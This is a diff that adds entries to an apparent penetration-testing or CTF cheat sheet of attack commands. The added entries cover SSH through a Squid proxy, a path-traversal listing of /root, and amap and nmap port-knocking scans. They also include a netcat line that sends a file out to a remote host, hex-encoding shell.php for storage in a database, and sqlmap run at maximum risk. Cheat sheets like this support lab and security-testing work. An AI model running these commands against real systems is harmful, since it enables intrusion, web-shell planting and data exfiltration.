@@ -122,3 +122,49 @@ WEB SERVERS:
 dirb http://host -X .txt,.php,.html ## Look for hidden files
 cadaver http://host/path/ ## if DAV is enabled, cadaver will provide a FTP like interface for easy access
 curl -i -X OPTIONS http://host ## to find HTTP methods allowed, look for PUT MOVE COPY etc...
+
+####MORE COMMANDS ####
+
+Connect SSH via Squid:
+
+ssh -o ProxyCommand='socat STDIO PROXY:192.168.56.102:%h:%p,proxyport=3128' john@192.168.56.102
+
+
+DIR listing trick:
+
+ls /accounts/../../../root/
+
+
+Protocol port match enumeration:
+
+amap 192.168.159.132 21 22 53 80 139 666 3306 12380
+
+Find IP via arp-scan:
+
+arp-scan -l
+
+Netcat receive file:
+
+cat file.zip | nc 1.2.3.4 port
+
+Find hidden in binary:
+
+binwalk -B filename
+
+Convert to ascii to hex (good for db storage):
+
+cat shell.php | xxd -ps | tr -d '\n'
+
+Rember to add the prefix “0x” to make it hex officially
+
+Port knocking with nmap:
+
+nmap -Pn --host_timeout 201 --max-retries 0  -p 1 192.168.0.101
+nmap -Pn --host_timeout 201 --max-retries 0  -p 2 192.168.0.101
+nmap -Pn --host_timeout 201 --max-retries 0  -p 3 192.168.0.101
+
+And rescan with nmap -sT -p- -A 192.168.0.10
+
+SQLmap for enumeration:
+
+sqlmap -o -u http://192.168.56.103:1337/978345210/index.php --forms --dbs --risk=3 --level=5
